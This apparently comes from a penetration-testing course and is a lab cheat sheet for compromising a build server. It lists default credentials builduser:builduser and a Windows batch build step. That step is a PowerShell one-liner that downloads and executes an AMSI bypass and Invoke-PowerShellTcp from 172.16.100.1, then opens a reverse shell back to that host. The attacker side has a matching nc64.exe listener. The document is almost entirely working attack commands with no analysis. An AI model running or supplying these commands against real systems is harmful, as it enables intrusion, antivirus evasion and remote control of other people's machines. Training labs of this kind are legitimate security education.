**Port:** 8080
**Default_crest:** builduser:builduser

**Build Steps(Execute Windows batch command):**
```powershell
powershell -c "iex (iwr -UseBasicParsing http://172.16.100.1/amsibypass.txt); iex (iwr -UseBasicParsing http://172.16.100.1/Invoke-PowerShellTcp.ps1); Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.1 -Port 443"
```

**In student-machine:**
```powershell
nc64.exe -lvnp 443
```
